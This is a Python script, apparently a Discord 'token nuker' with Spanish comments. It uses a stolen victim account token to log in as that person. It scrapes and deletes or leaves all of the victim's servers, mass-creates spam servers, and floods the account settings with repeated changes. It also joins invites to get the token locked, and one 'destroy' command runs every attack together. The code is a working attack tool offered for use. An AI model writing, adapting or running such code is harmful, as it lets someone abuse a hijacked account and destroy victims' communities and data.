#======== Token Fvcker (GHOSTAKE NUKER)
#======== !$.noctu#4847
#======== HackerSquad
#====================================

import discord, threading, colorama, requests, time, json
import os, sys
from discord.ext import commands
from discord.ext import tasks
from colorama import Fore 
bot = commands.Bot(command_prefix="!", self_bot=True)
bot.remove_command("help")


colorama.init()
token = "TOKEN DE LA VICTIMA"
servername= "NICK DE SERVERS QUE SPAMEARA"

headers = {
 'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
 'Content-Type': 'application/json',
 'Authorization': token,
}

#<------------------Command TokenFuck------------------>

def exit():
  time.sleep(1)
  print(f"{Fore.GREEN}[$]{Fore.RESET} ¡Espero te hayas divertido...!")
  time.sleep(1)
  sys.exit()

def tokenfuck():
      global headers
      payload = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
      }
      print(f"{Fore.GREEN}[+] {Fore.RED} Token Fvckeado")
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      to_back()

#<------------------Command Themes------------------>

def themes():
    global headers
    tema1 = {
      'theme': "dark"
      }
    tema2 = {
      'theme': "light"
      }
    for i in range(1000):
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=tema2)
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=tema1)
      print(f"{Fore.GREEN}[+] {Fore.RED} Cambiando Temas")
    to_back()

#<------------------Command Langfuck------------------>

def langfuck():
    global headers
    lenguaje1 = {
          'locale': "ro"
      }
    lenguaje2 = {
          'locale': "ja"
      }
    lenguaje3 = {
          'locale': "fr"
      }
    for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=lenguaje1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=lenguaje2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=lenguaje3)
        print(f"{Fore.GREEN}[+] {Fore.RED} Cambiando Lenguaje")
    to_back()

#<------------------Command Statusrape------------------>

def statusrape():
      global headers
      print(f"{Fore.GREEN}[+] {Fore.RED}Cambiando estados")
      time.sleep(3)
      status1 = {
          'status': "dnd"
      }
      status2 = {
          'status': "idle"
      }
      status3 = {
          'status': "invisible"
      } 
      status4 = {
          'status': "online"
      }
      for i in range(100):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=status1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=status2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=status3)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=status4)
      to_back()

#<------------------Command ServerSpam and ServerNuke------------------>

def serverspam():
    global servername
    global headers
    guild = {
    'name': f"{servername}"
    } 
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"{Fore.GREEN}[+] {Fore.RED} Servidor Creado: {Fore.WHITE}{servername}")
    to_back()
def servernuke():
 global headers
 with open("servers.txt", "r") as f:
    servers = f.read().splitlines()
 for lines in servers: 
   requests.post(f'https://discord.com/api/v9/guilds/{lines}/delete', headers=headers)
   requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{lines}', headers=headers)
   print(f'{Fore.GREEN}[+] {Fore.RED}Server Nukeado > {lines}')
   to_back()
   
#<------------------Command TokenStress------------------>

def tokenstress():
 global headers
 requests.post(f'https://discord.com/api/v9/invites/lol', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/lgbtq', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/astfolo', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/hey', headers=headers)
 requests.post(f'https://discord.com/api/v9/invites/lmao', headers=headers)

#<------------------Command Destroy------------------>
#=========Con este comando literalmente te vuelves mierda el token sin necesidad de ejecutar los demas comandos.

def destroy():
  threading.Thread(target=servernuke).start()
  time.sleep(20)
  threading.Thread(target=serverspam).start()
  threading.Thread(target=statusrape).start()
  threading.Thread(target=themes).start()
  threading.Thread(target=langfuck).start()
  
 
#<------------------Token Fucker Ready------------------>


@bot.event
async def on_ready():
 os.remove("servers.txt")
 for guild in bot.guilds:
  server = bot.get_guild(guild.id)
  print(f"{Fore.GREEN}[+] {Fore.RED}Scraped {server.id}")
  f = open("servers.txt", "a+")
  f.write(f"{server.id}\n")
 Home()

#<------------------Banner------------------>

def to_back():
 Home()
def Home():
  os.system('cls')
  print(f'''
  {Fore.GREEN}
  {Fore.GREEN}                          uuuuuuu
  {Fore.GREEN}                      uu$$$$$$$$$$$uu
  {Fore.GREEN}                   uu$$$$$$$$$$$$$$$$$uu
  {Fore.GREEN}                  u$$$$$$$$$$$$$$$$$$$$$u
  {Fore.GREEN}                 u$$$$$$$$$$$$$$$$$$$$$$$u
  {Fore.GREEN}                u$$$$$$$$$$$$$$$$$$$$$$$$$u
  {Fore.GREEN}                u$$$$$$$$$$$$$$$$$$$$$$$$$u
  {Fore.GREEN}                u$$$$$$"   "$$$"   "$$$$$$u
  {Fore.GREEN}                "$$$$"      u$u       $$$$"
  {Fore.GREEN}                 $$$u       u$u       u$$$
  {Fore.GREEN}                 $$$u      u$$$u      u$$$
  {Fore.GREEN}                  "$$$$uu$$$   $$$uu$$$$"
  {Fore.GREEN}                   "$$$$$$$"   "$$$$$$$"
  {Fore.GREEN}                     u$$$$$$$u$$$$$$$u
  {Fore.GREEN}                      u$"$"$"$"$"$"$u
  {Fore.GREEN}           uuu        $$u$ $ $ $ $u$$       uuu
  {Fore.GREEN}          u$$$$        $$$$$u$u$u$$$       u$$$$
  {Fore.GREEN}          $$$$$uu      "$$$$$$$$$"       uu$$$$$$
  {Fore.GREEN}         u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
  {Fore.GREEN}        $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
  {Fore.GREEN}            """      ""$$$$$$$$$$$uu ""$"""
  {Fore.GREEN}               uuuu ""$$$$$$$$$$uuu
  {Fore.GREEN}          u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  {Fore.GREEN}          $$$$$$$$$$""""           ""$$$$$$$$$$$"
  {Fore.GREEN}          "$$$$$"                      ""$$$$""
  {Fore.GREEN}           $$$"                         $$$$"


  {Fore.RED}
  {Fore.YELLOW}        ╔═╗┬ ┬┌─┐╔═╗╔╦╗╔═╗╦╔═╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗  ┌┼┐
  {Fore.YELLOW}        ║ ╦├─┤│ │╚═╗ ║ ╠═╣╠╩╗║╣   ║║║║ ║╠╩╗║╣ ╠╦╝  └┼┐
  {Fore.YELLOW}        ╚═╝┴ ┴└─┘╚═╝ ╩ ╩ ╩╩ ╩╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═  └┼┘
  {Fore.WHITE}                    !$. noctu#4847
  {Fore.WHITE}           ╔══════════════════════════════════╗
  {Fore.GREEN}           |[1]  serverspam [2]  tokenfuck    |
  {Fore.GREEN}           |[3]  themes     [4]  langfuck     |
  {Fore.GREEN}           |[5]  statusrape [6]  servernuke   |
  {Fore.GREEN}           |[7]  destroy    [8]  locktoken    |
  {Fore.GREEN}           |[9]  exit                         |
  {Fore.WHITE}           ╚══════════════════════════════════╝
  ''')                           
  shit = input("[$] >> ")
  if shit == '1':
    serverspam()
  if shit == '2':
      tokenfuck()
  if shit == '3':
      themes()
  if shit == '4':
      langfuck() 
  if shit == '5':
     statusrape()
  if shit == '6':
     servernuke()
  if shit == '7':
    destroy()
  if shit == '8':
   tokenstress()
  if shit == '9':
    exit()

#=======Aclaraciones:
#=======La funcion "to_back" sirve para que despues que ejecutes un comando, te envie directamente de nuevo al banner para ejecutar mas comandos.
#=======La decision de como atacar es tuya, como dije arriba puedes ejecutar "destroy" o "tokenfuck" y se te facilita el trabajo, pero bueno todo es como tu lo decidas. (Recomiendo mas que usen el destroy.)


bot.run(token, bot = False)
